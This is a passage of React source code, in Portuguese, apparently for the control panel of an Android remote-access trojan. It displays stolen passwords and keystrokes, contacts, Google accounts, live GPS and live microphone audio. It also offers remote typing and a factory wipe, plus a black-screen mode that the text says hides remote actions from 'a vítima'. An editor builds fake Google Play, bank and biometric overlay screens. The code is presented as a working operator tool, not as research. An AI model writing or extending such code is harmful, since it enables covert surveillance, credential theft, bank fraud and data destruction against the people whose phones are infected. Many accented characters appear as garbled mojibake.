                            <div className="flex items-center gap-1.5 px-2.5 py-1 rounded bg-[#0e1c36] text-pink-300 font-bold text-xs border border-[#162744]">
                              {getAppIcon(item.package, item.appName)}
                              <span>{item.appName}</span>
                            </div>
                            {item.isPassword && (
                              <span className="text-[10px] px-2 py-0.5 bg-amber-500/20 text-amber-300 border border-amber-500/40 rounded uppercase font-bold flex items-center gap-1">
                                ðŸ”‘ Senha Capturada
                              </span>
                            )}
                            {!item.isPassword && item.displayCategory === 'typed' && (
                              <span className="text-[10px] px-2 py-0.5 bg-red-500/20 text-pink-300 border border-red-500/40 rounded uppercase font-bold flex items-center gap-1">
                                âŒ¨ï¸ Digitado
                              </span>
                            )}
                            {item.displayCategory === 'window' && (
                              <span className="text-[10px] px-2 py-0.5 bg-red-500/20 text-pink-300 border border-red-500/40 rounded uppercase font-bold flex items-center gap-1">
                                ðŸ“± Tela
                              </span>
                            )}
                            {item.isOffline && (
                              <span className="text-[10px] px-2 py-0.5 bg-purple-500/20 text-purple-300 border border-purple-500/30 rounded uppercase font-bold">
                                ðŸ“´ Offline
                              </span>
                            )}
                          </div>
                          <span className="text-[11px] text-slate-500" title={item.dateStr}>
                            {item.dateStr ? `${item.dateStr} ` : ''}{item.timeStr}
                          </span>
                        </div>

                        {item.subInfo && (
                          <div className="text-[10.5px] text-slate-400 font-mono">
                            <span className="text-slate-500">Detalhes: </span>{item.subInfo}
                          </div>
                        )}

                        {item.isPassword ? (
                          <div className="bg-[#140f06] border border-amber-500/40 rounded-xl p-3 flex items-center justify-between gap-3 shadow-inner">
                            <div className="flex items-center gap-2 overflow-hidden">
                              <Key className="w-4 h-4 text-amber-400 shrink-0" />
                              <span className="font-mono font-black text-amber-200 text-sm tracking-wider select-all break-all">
                                {item.mainText}
                              </span>
                            </div>
                            <button
                              onClick={() => {
                                navigator.clipboard.writeText(item.mainText);
                                showToast('Senha copiada!', 'success');
                              }}
                              className="px-3 py-1.5 rounded-lg bg-amber-500/20 hover:bg-amber-500/40 text-amber-300 text-xs font-bold shrink-0 transition-all flex items-center gap-1"
                              title="Copiar Senha"
                            >
                              <Copy className="w-3.5 h-3.5" /> Copiar
                            </button>
                          </div>
                        ) : item.displayCategory === 'typed' ? (
                          <div className="bg-[#060c18] border border-red-500/30 rounded-xl p-3 flex items-center justify-between gap-3 shadow-inner">
                            <span className="font-sans font-medium text-slate-100 text-xs leading-relaxed select-all break-all">
                              {item.mainText}
                            </span>
                            <button
                              onClick={() => {
                                navigator.clipboard.writeText(item.mainText);
                                showToast('Texto copiado!', 'success');
                              }}
                              className="px-3 py-1.5 rounded-lg bg-[#0c1830] hover:bg-red-500/20 text-red-400 text-xs font-bold shrink-0 transition-all flex items-center gap-1"
                              title="Copiar Texto"
                            >
                              <Copy className="w-3.5 h-3.5" /> Copiar
                            </button>
                          </div>
                        ) : item.displayCategory === 'window' ? (
                          <div className="bg-[#060c18] border border-[#14233e] rounded-xl px-3 py-2 flex items-center gap-2.5 text-slate-300 text-xs font-mono">
                            <Tv className="w-4 h-4 text-red-400 shrink-0" />
                            <span className="truncate">{item.mainText}</span>
                          </div>
                        ) : item.displayCategory === 'click' ? (
                          <div className="bg-[#060c18] border border-[#14233e] rounded-xl px-3 py-2 flex items-center gap-2.5 text-slate-300 text-xs font-mono">
                            <Zap className="w-4 h-4 text-emerald-400 shrink-0" />
                            <span className="truncate">{item.mainText}</span>
                          </div>
                        ) : (
                          <div className="bg-[#060c18] border border-[#14233e] rounded-xl px-3 py-2 text-slate-300 text-xs font-mono">
                            <span className="truncate">{item.mainText}</span>
                          </div>
                        )}
                      </div>
                    ))
                )}
              </div>
            </div>
          </div>
        )}

        {/* ----------------------------------------------------------------- */}
        {/* 9. VISÃƒO: CONTATOS                                               */}
        {/* ----------------------------------------------------------------- */}
        {activeTab === 'contacts' && (
          <div className="w-full max-w-5xl space-y-4">
            <div className="bg-[#081020] border border-[#14233e] rounded-2xl p-5 shadow-lg space-y-4">
              <div className="flex items-center justify-between border-b border-[#14233e] pb-3">
                <h3 className="text-xs font-black uppercase text-slate-200 tracking-wider font-mono flex items-center gap-2">
                  <Users className="w-4 h-4 text-red-400" />
                  AGENDA DE CONTATOS
                </h3>
                <div className="flex items-center gap-3">
                  <input
                    type="text"
                    placeholder="Buscar contato..."
                    value={contactsSearch}
                    onChange={(e) => setContactsSearch(e.target.value)}
                    className="bg-[#0a1426] border border-[#152442] rounded-xl px-3 py-1.5 text-xs text-slate-100 placeholder-slate-500 outline-none w-48 font-mono"
                  />
                  <button
                    onClick={fetchContacts}
                    className="px-3 py-1.5 bg-[#0070f3] text-white rounded-xl text-xs font-mono font-bold uppercase flex items-center gap-1.5"
                  >
                    <RefreshCw className={`w-3 h-3 ${isLoadingContacts ? 'animate-spin' : ''}`} />
                    ATUALIZAR
                  </button>
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                {contactsList.length === 0 ? (
                  <div className="bg-[#091224] border border-[#14233e] rounded-xl p-8 text-center space-y-3 font-mono col-span-2">
                    <Users className="w-8 h-8 text-slate-500 mx-auto" />
                    <div className="text-xs font-bold text-slate-300">Nenhum contato capturado da agenda ainda</div>
                    <p className="text-[11px] text-slate-500 font-sans">
                      Clique em "Atualizar" para solicitar a sincronizaÃ§Ã£o da lista de contatos do aparelho.
                    </p>
                    <button
                      onClick={fetchContacts}
                      className="px-4 py-2 bg-[#0070f3] text-white rounded-xl text-xs font-bold uppercase inline-flex items-center gap-2 shadow-lg"
                    >
                      <RefreshCw className={`w-3.5 h-3.5 ${isLoadingContacts ? 'animate-spin' : ''}`} />
                      Solicitar Agenda de Contatos
                    </button>
                  </div>
                ) : (
                  contactsList
                    .filter((c) => (c.name || '').toLowerCase().includes(contactsSearch.toLowerCase()) || (c.phone || '').includes(contactsSearch))
                    .map((c) => (
                      <div key={c.id} className="bg-[#091224] border border-[#14233e] rounded-xl p-3 flex items-center justify-between">
                        <div className="flex items-center gap-3">
                          <div className="w-8 h-8 rounded-full bg-[#0070f3] flex items-center justify-center font-bold text-white text-xs">
                            {c.name ? c.name.charAt(0).toUpperCase() : 'C'}
                          </div>
                          <div>
                            <div className="font-bold text-xs text-white">{c.name}</div>
                            <div className="text-[10px] text-red-400 font-mono">{c.phone}</div>
                          </div>
                        </div>

                        <button
                          onClick={() => {
                            sendCommand({ action: 'CALL_PHONE', phone: c.phone });
                            showToast(`Iniciando chamada para ${c.name}...`, 'info');
                          }}
                          className="p-2 bg-[#0c1830] hover:bg-rose-950 border border-[#1d3257] hover:border-emerald-500/50 text-emerald-400 rounded-lg"
                        >
                          <Phone className="w-3.5 h-3.5" />
                        </button>
                      </div>
                    ))
                )}
              </div>
            </div>
          </div>
        )}

        {/* ----------------------------------------------------------------- */}
        {/* VISÃƒO: CONTAS GOOGLE & E-MAILS                                   */}
        {/* ----------------------------------------------------------------- */}
        {activeTab === 'google_accounts' && (
          <div className="w-full max-w-5xl space-y-4">
            <div className="bg-[#081020] border border-[#14233e] rounded-2xl p-5 shadow-lg space-y-4">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between border-b border-[#14233e] pb-3 gap-3">
                <h3 className="text-xs font-black uppercase text-slate-200 tracking-wider font-mono flex items-center gap-2">
                  <Mail className="w-4 h-4 text-amber-400" />
                  CONTAS GOOGLE & E-MAILS SINCRONIZADOS
                </h3>
                <div className="flex items-center gap-2">
                  <div className="relative flex-1 sm:w-64">
                    <Search className="w-3.5 h-3.5 absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" />
                    <input
                      type="text"
                      placeholder="Filtrar por e-mail..."
                      value={googleAccountsSearch}
                      onChange={(e) => setGoogleAccountsSearch(e.target.value)}
                      className="w-full bg-[#040914] border border-[#14233e] rounded-xl pl-9 pr-3 py-1.5 text-xs text-slate-200 focus:outline-none focus:border-amber-500/50 font-mono"
                    />
                  </div>
                  <button
                    onClick={fetchGoogleAccounts}
                    className="px-3 py-1.5 bg-amber-500 hover:bg-amber-600 text-black font-black rounded-xl text-xs font-mono uppercase flex items-center gap-1.5 shadow-[0_0_15px_rgba(245,158,11,0.4)] transition-colors shrink-0"
                  >
                    <RefreshCw className={`w-3 h-3 ${isLoadingGoogleAccounts ? 'animate-spin' : ''}`} />
                    ATUALIZAR
                  </button>
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                {googleAccountsList.length === 0 ? (
                  <div className="bg-[#091224] border border-[#14233e] rounded-xl p-8 text-center space-y-3 font-mono col-span-full">
                    <Mail className="w-10 h-10 text-amber-400/60 mx-auto" />
                    <div className="text-xs font-bold text-slate-300">Nenhuma conta Google ou e-mail registrado capturado ainda</div>
                    <p className="text-[11px] text-slate-500 font-sans max-w-md mx-auto">
                      Clique em "Solicitar Contas Google" para extrair todas as contas do Google (Gmail, Play Store, Sync) cadastradas no dispositivo.
                    </p>
                    <button
                      onClick={fetchGoogleAccounts}
                      className="px-4 py-2 bg-amber-500 hover:bg-amber-600 text-black font-black rounded-xl text-xs uppercase inline-flex items-center gap-2 shadow-lg transition-colors"
                    >
                      <RefreshCw className={`w-3.5 h-3.5 ${isLoadingGoogleAccounts ? 'animate-spin' : ''}`} />
                      Solicitar Contas Google do Aparelho
                    </button>
                  </div>
                ) : (
                  googleAccountsList
                    .filter((acc) => {
                      const email = typeof acc === 'string' ? acc : (acc as any)?.name || (acc as any)?.account || (acc as any)?.email || '';
                      return email.toLowerCase().includes(googleAccountsSearch.toLowerCase());
                    })
                    .map((acc, index) => {
                      const emailStr = typeof acc === 'string' ? acc : (acc as any)?.name || (acc as any)?.account || (acc as any)?.email || String(acc);
                      const typeStr = (acc as any)?.type || (emailStr.endsWith('@gmail.com') ? 'Google Account' : 'Sistema Android');
                      
                      return (
                        <div key={index} className="bg-[#091224] border border-[#14233e] hover:border-amber-500/40 rounded-xl p-3.5 flex items-center justify-between gap-3 group transition-all">
                          <div className="flex items-center gap-3 min-w-0">
                            <div className="w-9 h-9 rounded-xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center shrink-0">
                              <AtSign className="w-4 h-4 text-amber-400" />
                            </div>
                            <div className="min-w-0">
                              <div className="font-bold text-xs text-white truncate font-mono select-all" title={emailStr}>
                                {emailStr}
                              </div>
                              <div className="flex items-center gap-1.5 mt-0.5">
                                <span className="text-[9px] px-1.5 py-0.2 bg-amber-500/10 text-amber-300 border border-amber-500/20 rounded font-mono font-semibold">
                                  {typeStr}
                                </span>
                              </div>
                            </div>
                          </div>

                          <button
                            onClick={() => {
                              navigator.clipboard.writeText(emailStr);
                              showToast(`E-mail ${emailStr} copiado!`, 'success');
                            }}
                            className="p-2 bg-[#0c1830] hover:bg-amber-500/20 border border-[#1d3257] hover:border-amber-500/50 text-amber-400 rounded-lg shrink-0 transition-colors"
                            title="Copiar E-mail"
                          >
                            <Copy className="w-3.5 h-3.5" />
                          </button>
                        </div>
                      );
                    })
                )}
              </div>
            </div>
          </div>
        )}

        {/* ----------------------------------------------------------------- */}
        {/* 10. VISÃƒO: LOCALIZAÃ‡ÃƒO GPS                                       */}
        {/* ----------------------------------------------------------------- */}
        {activeTab === 'location' && (
          <div className="w-full max-w-5xl space-y-4">
            <div className="bg-[#081020] border border-[#14233e] rounded-2xl p-5 shadow-lg space-y-4">
              <div className="flex items-center justify-between border-b border-[#14233e] pb-3">
                <h3 className="text-xs font-black uppercase text-slate-200 tracking-wider font-mono flex items-center gap-2">
                  <MapPin className="w-4 h-4 text-red-400" />
                  LOCALIZAÃ‡ÃƒO GPS EM TEMPO REAL
                </h3>
                <button
                  onClick={() => {
                    sendCommand({ action: 'GET_LOCATION' });
                    showToast('Solicitando coordenadas GPS atualizadas...', 'info');
                  }}
                  className="px-3 py-1.5 bg-[#0070f3] text-white rounded-xl text-xs font-mono font-bold uppercase flex items-center gap-1.5 shadow-[0_0_15px_rgba(0,112,243,0.4)]"
                >
                  <RefreshCw className="w-3 h-3" />
                  ATUALIZAR COORDENADAS
                </button>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-3 text-xs font-mono">
                <div className="bg-[#091224] border border-[#14233e] rounded-xl p-3">
                  <span className="text-slate-400">Latitude:</span>
                  <div className="text-pink-300 font-bold text-sm mt-1">{gpsData?.lat !== undefined ? gpsData.lat : '--'}</div>
                </div>
                <div className="bg-[#091224] border border-[#14233e] rounded-xl p-3">
                  <span className="text-slate-400">Longitude:</span>
                  <div className="text-pink-300 font-bold text-sm mt-1">{gpsData?.lng !== undefined ? gpsData.lng : '--'}</div>
                </div>
                <div className="bg-[#091224] border border-[#14233e] rounded-xl p-3">
                  <span className="text-slate-400">PrecisÃ£o do GPS:</span>
                  <div className="text-emerald-400 font-bold text-sm mt-1">
                    {gpsData?.accuracy ? `Â± ${gpsData.accuracy} metros` : '--'}
                  </div>
                </div>
              </div>

              {gpsData && gpsData.lat && gpsData.lng ? (
                <div className="w-full h-80 bg-[#091224] border border-[#14233e] rounded-2xl relative overflow-hidden flex flex-col items-center justify-center p-4">
                  <iframe
                    title="GPS Location Map"
                    src={`https://maps.google.com/maps?q=${gpsData.lat},${gpsData.lng}&z=15&output=embed`}
                    className="w-full h-full rounded-xl border border-[#152747]"
                  />
                  <div className="mt-3 flex items-center justify-between w-full font-mono text-xs">
                    <span className="text-slate-300 font-bold">{gpsData.address || `${gpsData.lat}, ${gpsData.lng}`}</span>
                    <a
                      href={`https://www.google.com/maps?q=${gpsData.lat},${gpsData.lng}`}
                      target="_blank"
                      rel="noreferrer"
                      className="inline-flex items-center gap-1.5 px-3 py-1.5 bg-[#0070f3] text-white rounded-xl text-xs font-bold uppercase"
                    >
                      <ExternalLink className="w-3.5 h-3.5" />
                      Abrir no Google Maps
                    </a>
                  </div>
                </div>
              ) : (
                <div className="w-full h-72 bg-[#091224] border border-[#14233e] rounded-2xl flex items-center justify-center relative overflow-hidden p-6 text-center space-y-3 font-mono">
                  <div>
                    <MapPin className="w-10 h-10 text-red-400 mx-auto mb-3 animate-bounce" />
                    <div className="text-xs font-bold text-slate-300">Coordenadas GPS nÃ£o capturadas ainda</div>
                    <p className="text-[11px] text-slate-500 font-sans mt-1">
                      Clique em "Atualizar Coordenadas" para obter a localizaÃ§Ã£o em tempo real via GPS do celular.
                    </p>
                    <button
                      onClick={fetchLocation}
                      className="mt-3 inline-flex items-center gap-2 px-4 py-2 bg-[#0070f3] text-white rounded-xl text-xs font-bold uppercase shadow-lg"
                    >
                      <RefreshCw className={`w-3.5 h-3.5 ${isLoadingLocation ? 'animate-spin' : ''}`} />
                      Solicitar Coordenadas GPS
                    </button>
                  </div>
                </div>
              )}
            </div>
          </div>
        )}

        {/* ----------------------------------------------------------------- */}
        {/* 11. VISÃƒO: ÃUDIO AO VIVO                                         */}
        {/* ----------------------------------------------------------------- */}
        {activeTab === 'audio' && (
          <div className="w-full max-w-4xl space-y-4">
            <div className="bg-[#081020] border border-[#14233e] rounded-2xl p-5 shadow-lg space-y-4">
              <div className="flex items-center justify-between border-b border-[#14233e] pb-3">
                <h3 className="text-xs font-black uppercase text-slate-200 tracking-wider font-mono flex items-center gap-2">
                  <Mic className="w-4 h-4 text-red-400" />
                  ESCUTA & GRAVAÃ‡ÃƒO DE ÃUDIO AMBIENTE
                </h3>
              </div>

              <div className="w-full h-64 bg-black rounded-2xl border border-[#162744] flex items-center justify-center flex-col space-y-4">
                <div className={`w-20 h-20 rounded-full flex items-center justify-center ${isAudioListening ? 'bg-red-500/20 border-2 border-red-400 shadow-[0_0_30px_rgba(6,182,212,0.6)] animate-pulse' : 'bg-[#091224] border border-[#14233e]'}`}>
                  <Mic className={`w-8 h-8 ${isAudioListening ? 'text-red-400' : 'text-slate-500'}`} />
                </div>

                <div className="text-center font-mono">
                  <div className="font-bold text-xs text-white">
                    {isAudioListening ? 'TRANSMISSÃƒO DE ÃUDIO ATIVA' : 'ESCUTA DE ÃUDIO PARADA'}
                  </div>
                  <div className="text-[10px] text-slate-400 mt-0.5">Microfone do aparelho em tempo real</div>
                </div>

                <button
                  onClick={() => {
                    const next = !isAudioListening;
                    setIsAudioListening(next);
                    sendCommand({ action: next ? 'START_AUDIO_STREAM' : 'STOP_AUDIO_STREAM' });
                  }}
                  className={`px-6 py-2.5 rounded-xl font-mono text-xs font-bold uppercase shadow-lg transition-all ${
                    isAudioListening
                      ? 'bg-rose-600 hover:bg-rose-500 text-white shadow-[0_0_20px_rgba(244,63,94,0.5)]'
                      : 'bg-[#0070f3] hover:bg-[#0060d4] text-white shadow-[0_0_20px_rgba(0,112,243,0.5)]'
                  }`}
                >
                  {isAudioListening ? 'PARAR ESCUTA AO VIVO' : 'INICIAR ESCUTA AO VIVO'}
                </button>
              </div>
            </div>
          </div>
        )}
      </main>

      {/* Modal de Teclado Remoto */}
      {showKeyboardModal && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-[9999]">
          <div className="bg-[#081020] border-2 border-red-500/60 rounded-2xl p-5 max-w-md w-full mx-4 shadow-[0_0_40px_rgba(0,210,255,0.3)] space-y-4">
            <div className="flex items-center justify-between border-b border-[#14233e] pb-2.5">
              <h3 className="text-xs font-black uppercase text-white font-mono flex items-center gap-2">
                <Keyboard className="w-4 h-4 text-red-400" />
                DIGITAÃ‡ÃƒO REMOTA NO DISPOSITIVO
              </h3>
              <button
                onClick={() => setShowKeyboardModal(false)}
                className="p-1 text-slate-400 hover:text-white"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            <form onSubmit={handleSendKeyboard} className="space-y-3">
              <textarea
                value={keyboardInput}
                onChange={(e) => setKeyboardInput(e.target.value)}
                placeholder="Digite o texto que deseja injetar no teclado do celular..."
                rows={4}
                className="w-full bg-[#0a1426] border border-[#152442] rounded-xl p-3 text-xs text-slate-100 placeholder-slate-500 outline-none focus:border-red-500/60 font-mono resize-none"
              />

              <div className="flex justify-end gap-2">
                <button
                  type="button"
                  onClick={() => setShowKeyboardModal(false)}
                  className="px-4 py-2 bg-[#0c1830] text-slate-300 rounded-xl text-xs font-mono font-bold uppercase"
                >
                  Cancelar
                </button>
                <button
                  type="submit"
                  className="px-5 py-2 bg-[#0070f3] text-white rounded-xl text-xs font-mono font-bold uppercase shadow-[0_0_15px_rgba(0,112,243,0.5)]"
                >
                  Digitar no Celular
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Modal de Renomear Dispositivo */}
      {showRenameModal && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-[9999]">
          <div className="bg-[#081020] border-2 border-red-500/60 rounded-2xl p-5 max-w-md w-full mx-4 shadow-[0_0_40px_rgba(0,210,255,0.3)] space-y-4">
            <div className="flex items-center justify-between border-b border-[#14233e] pb-2.5">
              <h3 className="text-xs font-black uppercase text-white font-mono flex items-center gap-2">
                <Edit3 className="w-4 h-4 text-red-400" />
                ALTERAR NOME DO DISPOSITIVO
              </h3>
              <button
                onClick={() => setShowRenameModal(false)}
                className="p-1 text-slate-400 hover:text-white"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            <form onSubmit={handleRenameDevice} className="space-y-4">
              <div className="space-y-1.5">
                <label className="text-[11px] font-mono font-bold text-slate-400 uppercase tracking-wider">
                  Nome de ExibiÃ§Ã£o do Aparelho:
                </label>
                <input
                  type="text"
                  value={newDeviceName}
                  onChange={(e) => setNewDeviceName(e.target.value)}
                  placeholder="Ex: Celular Alvo #1"
                  className="w-full bg-[#0a1426] border border-[#152442] rounded-xl px-3 py-2.5 text-xs text-slate-100 placeholder-slate-500 outline-none focus:border-red-500/60 font-mono"
                  autoFocus
                />
              </div>

              <div className="flex justify-end gap-2 pt-2 border-t border-[#14233e]">
                <button
                  type="button"
                  onClick={() => setShowRenameModal(false)}
                  className="px-4 py-2 bg-[#0c1830] text-slate-300 rounded-xl text-xs font-mono font-bold uppercase hover:bg-[#122244] transition-colors"
                >
                  Cancelar
                </button>
                <button
                  type="submit"
                  disabled={isRenaming || !newDeviceName.trim()}
                  className="px-5 py-2 bg-[#0070f3] text-white rounded-xl text-xs font-mono font-bold uppercase shadow-[0_0_15px_rgba(0,112,243,0.5)] hover:bg-[#0060d0] disabled:opacity-50 transition-all flex items-center gap-1.5"
                >
                  {isRenaming ? 'Salvando...' : 'Salvar Nome'}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Modal de AÃ§Ã£o RÃ¡pida */}
      {quickActionModal && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-[9999]">
          <div className="bg-[#081020] border-2 border-red-500/60 rounded-2xl p-5 max-w-md w-full mx-4 shadow-[0_0_40px_rgba(0,210,255,0.3)] space-y-4">
            <div className="flex items-center justify-between border-b border-[#14233e] pb-2.5">
              <h3 className="text-xs font-black uppercase text-white font-mono flex items-center gap-2">
                <Send className="w-4 h-4 text-red-400" />
                ENVIAR AÃ‡ÃƒO RÃPIDA
              </h3>
              <button
                onClick={() => setQuickActionModal(false)}
                className="p-1 text-slate-400 hover:text-white"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            <div className="grid grid-cols-2 gap-2">
              {[
                { label: 'Despertar Tela', action: 'WAKEUP' },
                { label: 'Menu de Energia', action: 'POWER_MENU' },
                { label: 'Reiniciar VNC', action: 'RECONNECT_CONNECTION' },
                { label: 'Sincronizar Clipboard', action: 'DUMP_CLIPBOARD' }
              ].map((btn, idx) => (
                <button
                  key={idx}
                  onClick={() => {
                    sendCommand({ action: btn.action });
                    setQuickActionModal(false);
                  }}
                  className="py-2.5 px-3 bg-[#0a1426] hover:bg-[#0f1d38] border border-[#162744] hover:border-red-500/50 rounded-xl text-xs font-mono font-bold text-slate-200 uppercase"
                >
                  {btn.label}
                </button>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Modal de ConfirmaÃ§Ã£o: Formatar Dispositivo */}
      {showWipeConfirm && (
        <div className="fixed inset-0 bg-black/85 backdrop-blur-md flex items-center justify-center z-[9999] p-4">
          <div className="bg-[#081020] border-2 border-red-500/60 rounded-3xl p-6 max-w-md w-full shadow-[0_0_50px_rgba(239,68,68,0.3)] space-y-4 font-mono">
            <div className="flex items-center gap-3 border-b border-red-900/40 pb-3">
              <div className="w-10 h-10 rounded-2xl bg-red-500/20 border border-red-500/40 flex items-center justify-center text-red-400">
                <Trash2 className="w-5 h-5" />
              </div>
              <div>
                <h3 className="text-sm font-black text-white uppercase">Formatar Dispositivo</h3>
                <span className="text-[10px] text-red-400 font-bold">AÃ‡ÃƒO DESTRUITIVA E IRREVERSÃVEL</span>
              </div>
            </div>

            <p className="text-xs text-slate-300 leading-relaxed font-sans">
              Tem certeza que deseja enviar o comando de <b className="text-red-400">formataÃ§Ã£o de fÃ¡brica (Wipe Data)</b> para o dispositivo <b>{deviceName}</b>? Todos os dados do aparelho serÃ£o apagados. Esta aÃ§Ã£o requer privilÃ©gios de Administrador de Dispositivo ativo.
            </p>

            <div className="flex justify-end gap-2 pt-2 border-t border-[#14233e]">
              <button
                onClick={() => setShowWipeConfirm(false)}
                className="px-4 py-2 bg-[#0c1830] hover:bg-[#102244] text-slate-300 rounded-xl text-xs font-bold uppercase transition-all"
              >
                Cancelar
              </button>
              <button
                onClick={handleFormatDevice}
                className="px-5 py-2 bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-500 hover:to-rose-500 text-white font-black rounded-xl text-xs uppercase shadow-[0_0_20px_rgba(239,68,68,0.5)] border border-red-400/40 transition-all"
              >
                Sim, Formatar Celular
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Modal de Escolha: Tela Preta Normal vs PersonalizÃ¡vel */}
      {showBlackScreenChoiceModal && (
        <div className="fixed inset-0 bg-black/85 backdrop-blur-md flex items-center justify-center z-[9999] p-4">
          <div className="bg-[#081020] border-2 border-red-500/60 rounded-3xl p-6 max-w-2xl w-full shadow-[0_0_50px_rgba(0,210,255,0.25)] space-y-5 animate-in fade-in zoom-in duration-150 font-mono">
            {/* Header */}
            <div className="flex items-center justify-between border-b border-[#14233e] pb-3.5">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-2xl bg-red-500/10 border border-red-500/40 flex items-center justify-center text-red-400 shadow-[0_0_15px_rgba(6,182,212,0.3)]">
                  {isBlackScreen ? <EyeOff className="w-5 h-5 animate-pulse" /> : <Eye className="w-5 h-5" />}
                </div>
                <div>
                  <h3 className="text-sm font-black uppercase text-white tracking-wider flex items-center gap-2">
                    MODO TELA PRETA & TELAS OCULTAS
                  </h3>
                  <p className="text-[11px] text-slate-400 font-sans">
                    Escolha entre a tela preta normal (100% escura) ou tela personalizada com injects
                  </p>
                </div>
              </div>
              <button
                onClick={() => setShowBlackScreenChoiceModal(false)}
                className="p-2 rounded-xl text-slate-400 hover:text-white hover:bg-white/5 transition-all"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            {/* Banner de Estado Atual se Ativo */}
            {isBlackScreen && (
              <div className="p-3 bg-red-950/60 border border-red-500/50 rounded-2xl flex items-center justify-between gap-3 shadow-[0_0_20px_rgba(6,182,212,0.2)]">
                <div className="flex items-center gap-2.5">
                  <span className="flex h-3 w-3 relative">
                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
                    <span className="relative inline-flex rounded-full h-3 w-3 bg-red-500"></span>
                  </span>
                  <div>
                    <span className="text-xs font-black text-pink-300 uppercase tracking-wide">
                      TELA PRETA ESTÃ ATIVADA NO APARELHO
                    </span>
                    <span className="block text-[10px] text-slate-300 font-sans">
                      O display do aparelho estÃ¡ oculto para o usuÃ¡rio neste momento.
                    </span>
                  </div>
                </div>
                <button
                  onClick={() => {
                    handleToggleBlackScreen(false);
                    setShowBlackScreenChoiceModal(false);
                  }}
                  className="px-4 py-2 bg-red-600 hover:bg-red-500 text-white font-bold text-xs rounded-xl shadow-[0_0_15px_rgba(239,68,68,0.4)] transition-all flex items-center gap-1.5 shrink-0"
                >
                  <Eye className="w-3.5 h-3.5" />
                  DESATIVAR AGORA
                </button>
              </div>
            )}

            {/* Grid com as 2 OpÃ§Ãµes Principais: Normal vs Personalizada */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {/* OpÃ§Ã£o 1: Tela Preta Normal */}
              <div className="relative rounded-2xl bg-[#0a1426] border-2 border-[#162744] hover:border-red-500/60 p-4 flex flex-col justify-between transition-all group shadow-lg hover:shadow-[0_0_25px_rgba(6,182,212,0.2)]">
                <div className="space-y-3">
                  <div className="flex items-center justify-between">
                    <div className="w-10 h-10 rounded-xl bg-black border border-slate-700 flex items-center justify-center text-white shadow-inner">
                      <EyeOff className="w-5 h-5 text-red-400 group-hover:scale-110 transition-transform" />
                    </div>
                    <span className="text-[10px] font-bold px-2 py-0.5 rounded-full bg-red-500/10 text-pink-300 border border-red-500/30">
                      PADRÃƒO
                    </span>
                  </div>
                  <div>
                    <h4 className="text-xs font-black text-white uppercase tracking-wider">
                      â¬› TELA PRETA NORMAL
                    </h4>
                    <p className="text-[11px] text-slate-300 mt-1 font-sans leading-relaxed">
                      Oculta 100% da tela com fundo preto puro. A vÃ­tima nÃ£o vÃª as aÃ§Ãµes remotas executadas no aparelho.
                    </p>
                  </div>
                  <ul className="text-[10px] text-slate-400 space-y-1 font-sans">
                    <li className="flex items-center gap-1.5">
                      <span className="text-red-400 font-bold">âœ“</span> Fundo 100% escuro e limpo
                    </li>
                    <li className="flex items-center gap-1.5">
                      <span className="text-red-400 font-bold">âœ“</span> Bloqueia e esconde qualquer visualizaÃ§Ã£o
                    </li>
                    <li className="flex items-center gap-1.5">
                      <span className="text-red-400 font-bold">âœ“</span> AtivaÃ§Ã£o instantÃ¢nea
                    </li>
                  </ul>
                </div>

                <div className="mt-4 pt-3 border-t border-[#14233e]">
                  <button
                    onClick={() => {
                      handleToggleBlackScreen(true);
                      setShowBlackScreenChoiceModal(false);
                    }}
                    className="w-full py-2.5 px-4 rounded-xl bg-red-600 hover:bg-red-500 text-black font-black text-xs uppercase tracking-wider transition-all flex items-center justify-center gap-2 shadow-[0_0_15px_rgba(6,182,212,0.4)]"
                  >
                    <EyeOff className="w-4 h-4" />
                    ATIVAR TELA NORMAL
                  </button>
                </div>
              </div>

              {/* OpÃ§Ã£o 2: Tela PersonalizÃ¡vel */}
              <div className="relative rounded-2xl bg-[#0a1426] border-2 border-[#162744] hover:border-red-500/60 p-4 flex flex-col justify-between transition-all group shadow-lg hover:shadow-[0_0_25px_rgba(0,112,243,0.25)]">
                <div className="space-y-3">
                  <div className="flex items-center justify-between">
                    <div className="w-10 h-10 rounded-xl bg-red-950/60 border border-red-500/40 flex items-center justify-center text-pink-300 shadow-inner">
                      <Palette className="w-5 h-5 text-red-400 group-hover:scale-110 transition-transform" />
                    </div>
                    <span className="text-[10px] font-bold px-2 py-0.5 rounded-full bg-red-500/10 text-pink-300 border border-red-500/30">
                      CUSTOMIZÃVEL
                    </span>
                  </div>
                  <div>
                    <h4 className="text-xs font-black text-white uppercase tracking-wider">
                      ðŸŽ¨ TELA PERSONALIZADA
                    </h4>
                    <p className="text-[11px] text-slate-300 mt-1 font-sans leading-relaxed">
                      Abre o editor visual para desenhar telas customizadas (Google Play, bancos, biometria facial/digital e logos).
                    </p>
                  </div>
                  <ul className="text-[10px] text-slate-400 space-y-1 font-sans">
                    <li className="flex items-center gap-1.5">
                      <span className="text-red-400 font-bold">âœ“</span> Editor visual arrastar e soltar
                    </li>
                    <li className="flex items-center gap-1.5">
                      <span className="text-red-400 font-bold">âœ“</span> InjeÃ§Ã£o de biometria e logos
                    </li>
                    <li className="flex items-center gap-1.5">
                      <span className="text-red-400 font-bold">âœ“</span> Salvar e reutilizar seus modelos
                    </li>
                  </ul>
                </div>

